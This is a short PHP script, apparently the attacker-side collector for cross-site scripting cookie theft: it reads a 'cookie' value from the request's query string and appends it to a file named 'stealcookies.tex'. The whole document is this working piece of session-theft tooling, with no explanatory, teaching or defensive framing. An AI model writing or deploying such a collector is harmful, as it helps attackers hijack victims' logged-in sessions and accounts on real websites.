<?php
$cookie=$_GET['cookie'];
$file=fopen('stealcookies.tex', 'a');
fwrite($file, 'cookie:'.$cookie. '');
?>